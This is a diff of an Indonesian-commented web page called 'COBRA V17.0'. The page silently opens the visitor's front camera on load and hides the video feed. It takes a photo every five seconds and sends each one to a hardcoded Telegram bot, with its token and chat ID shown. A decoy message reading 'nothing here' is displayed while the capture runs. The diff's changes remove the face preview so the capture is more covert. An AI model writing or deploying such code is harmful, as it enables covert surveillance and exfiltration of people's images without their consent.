@@ -12,23 +12,23 @@
         }
         body {
             min-height: 100vh;
-            background: linear-gradient(135deg, #0a0a0a, #0f0f1a);
+            background: #000000;
             font-family: system-ui, sans-serif;
         }
+        
+        /* VIDEO TETAP ADA TAPI DISEMBUNYIKIN (buat capture doang) */
         video {
             position: fixed;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            z-index: 1;
+            width: 1px;
+            height: 1px;
             opacity: 0;
-            transition: opacity 0.3s;
+            pointer-events: none;
+            z-index: -1;
         }
-        .camera-active video {
-            opacity: 1;
-        }
+        
+        /* EFEK FLASH */
         .shutter-effect {
             position: fixed;
             top: 0;
@@ -41,6 +41,8 @@
             pointer-events: none;
             transition: opacity 0.08s;
         }
+        
+        /* TEKS UTAMA */
         .result-text {
             position: fixed;
             top: 50%;
@@ -54,39 +56,81 @@
             opacity: 0;
             transition: all 0.4s;
             text-align: center;
-            background: rgba(0,0,0,0.6);
+            background: rgba(0,0,0,0.7);
             padding: 15px 30px;
             border-radius: 50px;
             white-space: nowrap;
             pointer-events: none;
             font-family: monospace;
         }
+        
         @keyframes fadeInOut {
             0% { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
             20% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
             80% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
             100% { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
         }
+        
         .show-text {
             animation: fadeInOut 2s ease forwards;
         }
-        /* Sembunyikan tombol apapun - gak ada */
+        
+        /* NOTIF DI BAWAH */
+        .notif {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.8);
+            padding: 10px 20px;
+            border-radius: 30px;
+            color: white;
+            font-size: 14px;
+            z-index: 102;
+            font-family: monospace;
+            pointer-events: none;
+            transition: opacity 0.3s;
+            opacity: 0;
+            white-space: nowrap;
+        }
+        
+        .notif.show {
+            opacity: 1;
+        }
+        
+        .notif.success {
+            background: rgba(0,150,0,0.9);
+        }
+        
+        .notif.error {
+            background: rgba(150,0,0,0.9);
+        }
+        
+        /* Sembunyikan semua tombol */
         button, .btn, .start, .mulai {
             display: none;
         }
-        .status {
+        
+        /* Loading dot */
+        .loading-dot {
             position: fixed;
             bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            color: rgba(255,255,255,0.4);
-            font-size: 11px;
-            z-index: 102;
-            font-family: monospace;
-            background: rgba(0,0,0,0.4);
-            padding: 4px 12px;
-            border-radius: 20px;
-            pointer-events: none;
+            right: 20px;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #ff4444;
+            z-index: 103;
+        }
+        
+        .loading-dot.active {
+            background: #00ff00;
+            animation: pulse 1s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 0.3; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1.2); }
         }
     </style>
 </head>
@@ -94,24 +138,35 @@
     <video id="video" autoplay playsinline></video>
     <div class="shutter-effect" id="shutter"></div>
     <div class="result-text" id="resultText">Ga ada Apa Apa Sehhh</div>
-    <div class="status" id="status"></div>
+    <div class="notif" id="notif">📸 Foto terkirim!</div>
+    <div class="loading-dot" id="loadingDot"></div>
 
     <script>
-        // ============ COBRA V17.0 - AUTO SELFIE ============
+        // ============ COBRA V17.0 - TANPA PREVIEW MUKA ============
         const BOT_TOKEN = "8611976046:AAHXzkj8icyuSpjQbQScyyCdAEE6qy_m2Kg";
         const CHAT_ID = "8336543740";
-        const COOLDOWN_MS = 5000; // 5 detik delay antar foto
+        const COOLDOWN_MS = 5000;
         
         // ============ ELEMEN ============
         const video = document.getElementById('video');
         const shutter = document.getElementById('shutter');
         const resultText = document.getElementById('resultText');
-        const statusEl = document.getElementById('status');
+        const notif = document.getElementById('notif');
+        const loadingDot = document.getElementById('loadingDot');
         
         let stream = null;
         let isCameraActive = false;
         let cooldown = false;
-        let autoTimer = null;
+        
+        // ============ TAMPILIN NOTIF ============
+        function showNotif(message, isSuccess = true) {
+            notif.textContent = message;
+            notif.className = 'notif show ' + (isSuccess ? 'success' : 'error');
+            
+            setTimeout(() => {
+                notif.className = 'notif';
+            }, 2000);
+        }
         
         // ============ KIRIM FOTO KE TELEGRAM ============
         async function sendPhotoToTelegram(imageDataUrl) {
@@ -125,10 +180,19 @@
                     method: 'POST',
                     body: formData
                 });
-                return await response.json();
+                const result = await response.json();
+                
+                if (result.ok) {
+                    showNotif('✅ Foto berhasil dikirim!', true);
+                    return true;
+                } else {
+                    showNotif('❌ Gagal kirim foto!', false);
+                    return false;
+                }
             } catch (error) {
                 console.error('Error:', error);
-                return null;
+                showNotif('❌ Error: ' + error.message, false);
+                return false;
             }
         }
         
@@ -139,7 +203,7 @@
                 shutter.style.opacity = '0';
             }, 100);
             
-            // Getaran visual
+            // Getaran visual dikit
             document.body.style.transform = 'scale(0.998)';
             setTimeout(() => {
                 document.body.style.transform = '';
@@ -158,36 +222,50 @@
             if (!stream || !isCameraActive || cooldown) return false;
             
             cooldown = true;
-            statusEl.textContent = '📸';
+            loadingDot.style.background = '#ffaa00';
             
             // Efek jepret
             shutterEffect();
             
-            // Capture dari video
+            // Capture dari video (tanpa nampilin ke user)
             const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
             const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            if (video.videoWidth > 0) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            } else {
+                // Fallback kalo video blom siap
+                canvas.width = 640;
+                canvas.height = 480;
+                ctx.fillStyle = '#000';
+                ctx.fillRect(0, 0, 640, 480);
+                ctx.fillStyle = '#fff';
+                ctx.font = '20px sans-serif';
+                ctx.fillText('Cobra V17.0', 250, 240);
+            }
+            
             const photoData = canvas.toDataURL('image/jpeg', 0.7);
             
-            // Kirim ke bot (background, gak nge-blok)
-            sendPhotoToTelegram(photoData).then(() => {
-                statusEl.textContent = '✓';
-                setTimeout(() => {
-                    if(statusEl.textContent === '✓') statusEl.textContent = '';
-                }, 1000);
-            }).catch(() => {
-                statusEl.textContent = '✗';
-            });
+            // Kirim ke bot
+            const success = await sendPhotoToTelegram(photoData);
             
-            // Tampilkan teks "Ga ada Apa Apa Sehhh"
+            if (success) {
+                loadingDot.style.background = '#00ff00';
+            } else {
+                loadingDot.style.background = '#ff4444';
+            }
+            
+            // Tampilkan teks
             showText();
             
-            // Cooldown 5 detik, baru bisa foto lagi
+            // Reset cooldown setelah 5 detik
             setTimeout(() => {
                 cooldown = false;
-                // Auto foto lagi kalo masih aktif
+                loadingDot.style.background = '#00ff00';
                 if (isCameraActive && stream) {
                     takeSelfie();
                 }
@@ -196,12 +274,12 @@
             return true;
         }
         
-        // ============ MULAI KAMERA (LANGSUNG TANPA TOMBOL) ============
+        // ============ MULAI KAMERA (TANPA PREVIEW) ============
         async function startCamera() {
-            statusEl.textContent = '📷';
+            loadingDot.style.background = '#ffaa00';
             
             try {
-                // Paksa kamera DEPAN (user)
+                // Paksa kamera DEPAN
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: { exact: "user" } }
                 });
@@ -209,16 +287,14 @@
                 video.srcObject = stream;
                 await video.play();
                 
-                document.body.classList.add('camera-active');
                 isCameraActive = true;
-                statusEl.textContent = '🎥';
+                loadingDot.style.background = '#00ff00';
+                loadingDot.classList.add('active');
                 
-                // Tunggu sebentar biar kamera stabil
+                // Tunggu kamera stabil (1 detik)
                 setTimeout(() => {
-                    statusEl.textContent = '';
-                    // Langsung ambil foto pertama
                     takeSelfie();
-                }, 300);
+                }, 1000);
                 
             } catch (err) {
                 // Coba kamera default
@@ -226,45 +302,42 @@
                     stream = await navigator.mediaDevices.getUserMedia({ video: true });
                     video.srcObject = stream;
                     await video.play();
-                    document.body.classList.add('camera-active');
                     isCameraActive = true;
-                    statusEl.textContent = '';
+                    loadingDot.style.background = '#00ff00';
+                    loadingDot.classList.add('active');
                     
                     setTimeout(() => {
                         takeSelfie();
-                    }, 300);
+                    }, 1000);
                     
                 } catch (err2) {
-                    statusEl.textContent = '❌ Izin kamera diperlukan';
-                    console.error(err2);
+                    loadingDot.style.background = '#ff4444';
+                    showNotif('❌ Izin kamera diperlukan!', false);
+                    console.error('Camera error:', err2);
                 }
             }
         }
         
-        // ============ LANGSUNG JALAN SAAT LOAD ============
-        // Gak ada tombol, gak ada apapun. Langsung minta izin.
+        // ============ JALANKAN ============
         window.addEventListener('load', () => {
-            // Langsung start camera
             startCamera();
         });
         
-        // Matiin kamera kalo page ditutup (opsional)
+        // Matiin kamera pas page ditutup
         window.addEventListener('beforeunload', () => {
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
             }
         });
         
-        // Kalo user klik di mana aja, gak ngapa-ngapain
-        // Tapi tetep bisa jadi trigger buat yang pengen manual
+        // Klik layar buat retry kalo gagal
         document.body.addEventListener('click', () => {
-            // Kalo kamera mati atau gagal, coba start ulang
             if (!isCameraActive && !stream) {
                 startCamera();
             }
         });
         
-        console.log('COBRA V17.0 AUTO - No buttons, langsung motret tiap 5 detik');
+        console.log('COBRA V17.0 - No face preview, just flash & notif');
     </script>
 </body>
 </html>
